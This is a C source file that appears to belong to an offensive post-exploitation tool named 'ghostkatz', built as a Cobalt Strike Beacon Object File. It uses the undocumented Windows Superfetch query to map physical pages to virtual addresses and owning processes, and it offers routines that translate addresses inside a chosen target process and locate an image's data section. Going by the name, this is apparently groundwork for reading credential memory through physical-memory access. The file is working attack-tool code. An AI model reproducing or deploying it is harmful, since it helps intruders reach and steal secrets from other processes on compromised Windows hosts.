#include <windows.h>
#include <stdint.h>

#include "superfetch.h"
#include "ghostkatz.h"

BOOL QuerySuperfetchMemoryRanges(SUPERFETCH_INFORMATION* superfetchInfo, PPF_MEMORY_RANGE_INFO_V2* info)
{
    PF_MEMORY_RANGE_INFO_V2 probe = { 0 };

    ULONG returnLength = 0;
    // --- Step 1: probe memory ranges ---
    probe.version = 2; // required for new versions of Windows
    (*superfetchInfo).Data = &probe;
    (*superfetchInfo).Length = sizeof(probe);

    // This function will fail and return the length required
    NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);


    // --- Step 2: allocate proper amount of buffer for ranges ---
    *info = (PPF_MEMORY_RANGE_INFO_V2)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, returnLength);
    (*info)->version = 2;

    // --- Step 3: Call the function for real ---
    (*superfetchInfo).Data = *info;
    (*superfetchInfo).Length = returnLength;

    NTSTATUS status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &returnLength);
    if (status != 0)
    {
        BeaconFormatPrintf(&outputbuffer, "NtQuerySystemInformation (SuperfetchMemoryRangesQuery) failed: %lx\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL BuildGlobalDatabase(SUPERFETCH_INFORMATION* superfetchInfo, PPF_MEMORY_RANGE_INFO_V2* info, PTRANSLATION_INFORMATION* pGlobalTranslationInfo)
{
    size_t bufferBase = 0;
    for (int i = 0; i < (*info)->ranges_count; i++)
    {
        PF_PHYSICAL_MEMORY_RANGE* range = &(*info)->ranges[i];      // Current PF_PHYSICAL_MEMORY_RANGE struct iteration (current range)
        ULONG_PTR basePfn = range->BasePfn;
        size_t pageCount = range->PageCount;

        // PF_PFN_PRIO_REQUEST struct contains the MMPFN_IDENTITY struct information for the whole range
        // We build the PF_PFN_PRIO_REQUEST struct to send a proper request
        // MMPFN_IDENTITY gets filled and we can parse it for detailed information
        size_t PfnDataSize = FIELD_OFFSET(PF_PFN_PRIO_REQUEST, PageData) + pageCount * sizeof(MMPFN_IDENTITY);
        PF_PFN_PRIO_REQUEST* PfPfnPrioRequestData = (PF_PFN_PRIO_REQUEST*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PfnDataSize);
        PfPfnPrioRequestData->Version = 1;
        PfPfnPrioRequestData->RequestFlags = 1;
        PfPfnPrioRequestData->PfnCount = pageCount;

        for (ULONG_PTR j = 0; j < pageCount; j++) {
            PfPfnPrioRequestData->PageData[j].PageFrameIndex = basePfn + j;
        }

        // SUPERFETCH_INFORMATION struct for upcoming NtQuerySystemInformation
        (*superfetchInfo).Data = PfPfnPrioRequestData;
        (*superfetchInfo).Length = PfnDataSize;
        (*superfetchInfo).InfoClass = SuperfetchPfnQuery;

        // Send request
        ULONG ResultLength = 0;
        NTSTATUS status = NtQuerySystemInformation(SystemSuperfetchInformation, superfetchInfo, sizeof(*superfetchInfo), &ResultLength);
        if (status != 0)
        {
            BeaconFormatPrintf(&outputbuffer, "NtQuerySystemInformation SuperfetchPfnQuery failed! Error: 0x%lx\n", GetLastError());
            return -1;
        }

        // Allocate temporary buffer that will store the Translation Information for each range individually
        // The goal is to copy it to the global buffer one range-buffer at a time
        PVOID pPerRangeTranslationInfoBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pageCount * sizeof(TRANSLATION_INFORMATION));
        //DEBUG_PRINT("[Range %d] Allocated temporary %llu sized buffer!\n", i, pageCount * sizeof(TRANSLATION_INFORMATION));

        PTRANSLATION_INFORMATION pTranslationInfo = (PTRANSLATION_INFORMATION)pPerRangeTranslationInfoBuffer;

        for (int k = 0; k < pageCount; k++)
        {
            // Parse the returned data stored in the MMPFN_IDENTITY structure
            MMPFN_IDENTITY pfnIdentity = PfPfnPrioRequestData->PageData[k];
            pTranslationInfo[k].PageFrameIndex = pfnIdentity.PageFrameIndex;
            pTranslationInfo[k].PagePhysicalAddress = (pfnIdentity.PageFrameIndex << PAGE_SHIFT);
            pTranslationInfo[k].PageVirtualAddress = (DWORD64)pfnIdentity.u2.VirtualAddress;
            pTranslationInfo[k].UniqueProcessKey = pfnIdentity.u1.e4.UniqueProcessKey;
        }

        // Copy the temporary range buffer to the global
        // Account for the bufferBase to prevent overwriting previous range buffer entries since this is a for loop
        memcpy((PBYTE)*pGlobalTranslationInfo + bufferBase, pTranslationInfo, pageCount * sizeof(TRANSLATION_INFORMATION));
        //DEBUG_PRINT("[Range %d] Copied temporary range buffer to global database!\n", i);
        bufferBase += pageCount * sizeof(TRANSLATION_INFORMATION);

        HeapFree(GetProcessHeap(), 0, pPerRangeTranslationInfoBuffer);
        HeapFree(GetProcessHeap(), 0, PfPfnPrioRequestData);
    }
    HeapFree(GetProcessHeap(), 0, *info);
    return TRUE;
}

PTRANSLATION_INFORMATION pGlobalTranslationInfo;
size_t TotalRangePageCount = 0;

BOOL CreateGlobalSuperfetchDatabase()
{
    BeaconFormatPrintf(&outputbuffer, "[+] Creating Global Pfn Database...\n");


    // Step 1 - Call Superfetch the first time to get all the physical memory ranges
    PPF_MEMORY_RANGE_INFO_V2 info = { 0 };
    SUPERFETCH_INFORMATION superfetchInfo = {
            .Version = SUPERFETCH_VERSION, // must be 45 (0x2D)
            .Magic = SUPERFETCH_MAGIC,   // 'kuhC' bytes
            .InfoClass = SuperfetchMemoryRangesQuery,
    };

    BOOL bResult = QuerySuperfetchMemoryRanges(&superfetchInfo, &info); // Use SuperfetchMemoryRangesQuery
    if (!bResult)
        return -1;

    // Optionally print out their information
    //PrintRangesV2(info); 


    // Step 2 - Get the total number of pages so we can calculate global database buffer size
    TotalRangePageCount = 0;
    for (int i = 0; i < info->ranges_count; i++)
    {
        PF_PHYSICAL_MEMORY_RANGE* range = &info->ranges[i];      // Current PF_PHYSICAL_MEMORY_RANGE struct iteration (current range)
        ULONG_PTR basePfn = range->BasePfn;                      // What is the base pfn of the range
        size_t pageCount = range->PageCount;                     // How many pages are in the range
        TotalRangePageCount += pageCount;
    }
    //DEBUG_PRINT("Total Number of pages: %llu\n", TotalRangePageCount);


    // Step 3 - Allocate global database buffer
    PVOID pGlobalTranslationInformationBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TotalRangePageCount * sizeof(TRANSLATION_INFORMATION));
    //DEBUG_PRINT("Allocated %llu sized buffer!\n", TotalRangePageCount * sizeof(TRANSLATION_INFORMATION));


    // Step 4 - Query each range to get detailed information such as the MMPFN_IDENTITY structure
    BeaconFormatPrintf(&outputbuffer, "[+] Building database...\n");
    pGlobalTranslationInfo = (PTRANSLATION_INFORMATION)pGlobalTranslationInformationBuffer;
    BuildGlobalDatabase(&superfetchInfo, &info, &pGlobalTranslationInfo);


    BeaconFormatPrintf(&outputbuffer, "[+] Finished building database!\n");

    return TRUE;
}


BOOL TranslateV2P(DWORD64 VirtualAddress, DWORD64* PhysicalAddress)
{
    
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        if ((VirtualAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PageVirtualAddress)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;
            //printf("[Page Info] VA=0x%llx -> PA=0x%llx\n", PageVA, PagePA);

            *PhysicalAddress = PagePA + (VirtualAddress - (DWORD64)PageVA);
            //printf("[Translation Info] VA: 0x%llx -> PA: 0x%llx\n", VirtualAddress, *PhysicalAddress);

            return TRUE;
        }
    }

    return FALSE;
}

BOOL TranslateP2V(DWORD64 PhysicalAddress, DWORD64* VirtualAddress)
{
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        if ((PhysicalAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PagePhysicalAddress)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;

            *VirtualAddress = PageVA + (PhysicalAddress - (DWORD64)PagePA);
            //printf("PA: 0x%llx -> VA: 0x%llx\n", PhysicalAddress, *VirtualAddress);

            return TRUE;
        }
    }

    return FALSE;
}

BOOL TranslateUVA2Physical(DWORD64 VirtualAddress, DWORD64* PhysicalAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID)
{
    if (TargetUniqueProcessKey == 0 || TargetPID == 0)
    {
        BeaconFormatPrintf(&outputbuffer, "Did not pass in target UniqueProcessKey or PID!\n");
        return FALSE;
    }

    // Loop through all structs in global database
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        // Check if the target process UPK matches with the page UPK. UPK can be represented as either lower 32 bits of _EPROCESS, or PID.
        if (pGlobalTranslationInfo[i].UniqueProcessKey == TargetUniqueProcessKey || pGlobalTranslationInfo[i].UniqueProcessKey == TargetPID)
        {
            // If UPK's match then process is found; check if the target address to translate resides in page
            if ((VirtualAddress & ~0xFFF) == (DWORD64)pGlobalTranslationInfo[i].PageVirtualAddress)
            {
                DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
                DWORD64 PagePA = pGlobalTranslationInfo[i].PagePhysicalAddress;
                //printf("[Page Info] VA: 0x%llx -> PA: 0x%llx\n", PageVA, PagePA);

                // Add offset from page to get address
                *PhysicalAddress = PagePA + (VirtualAddress - (DWORD64)PageVA);
                //printf("[Target Info] VA: 0x%llx -> PA: 0x%llx\n", VirtualAddress, *PhysicalAddress);

                return TRUE;
            }
        }
    }

    return FALSE;
}

DWORD64 GetDataSectionBase(DWORD64 ImageStartAddress, DWORD64 ImageEndAddress, DWORD TargetUniqueProcessKey, DWORD TargetPID)
{
    DWORD64 LowestAddressInImageRange = ImageEndAddress;

    // Loop through all structs in global database
    for (size_t i = 0; i < TotalRangePageCount; i++)
    {
        // Check if the target process UPK matches with the page UPK. UPK can be represented as either lower 32 bits of _EPROCESS, or PID.
        if (pGlobalTranslationInfo[i].UniqueProcessKey == TargetUniqueProcessKey || pGlobalTranslationInfo[i].UniqueProcessKey == TargetPID)
        {
            DWORD64 PageVA = pGlobalTranslationInfo[i].PageVirtualAddress;
            if (PageVA > ImageStartAddress && PageVA < ImageEndAddress)
            {
                if (PageVA < LowestAddressInImageRange)
                {
                    LowestAddressInImageRange = PageVA;
                }
            }
        }
    }

    return LowestAddressInImageRange;
}